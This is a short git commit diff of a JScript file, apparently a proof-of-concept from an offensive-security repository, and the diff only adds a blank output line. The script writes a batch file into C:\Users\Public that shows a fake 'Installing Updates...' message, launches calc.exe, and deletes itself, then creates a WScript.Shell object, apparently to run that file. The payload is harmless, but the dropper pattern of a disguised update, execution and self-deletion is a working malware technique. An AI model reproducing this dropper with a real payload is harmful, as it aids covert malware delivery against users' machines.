cd8346f01f8b9ffaf49da3b6a2061be843cbc099
scr1ptk1tt3n <scr1ptk1tt3n@gmail.com>
2023-03-23 21:37:49 -0400

    Update write-txt-public-dir-exec-calc.js

--- write-txt-public-dir-exec-calc.js
+++ write-txt-public-dir-exec-calc.js
@@ -1,7 +1,8 @@
 var fso  = new ActiveXObject("Scripting.FileSystemObject"); 
 var fh = fso.CreateTextFile("C:\\Users\\Public\\calc-exec.bat", true);
 fh.WriteLine("@echo off");
-fh.WriteLine("echo Installing Updates... & C:\\Windows\\System32\\calc.exe"); 
+fh.WriteLine("echo.");
+fh.WriteLine("echo  Installing Updates... & C:\\Windows\\System32\\calc.exe"); 
 fh.WriteLine('DEL "%~f0"');
 fh.Close();
 var WshShell = new ActiveXObject("WScript.Shell");
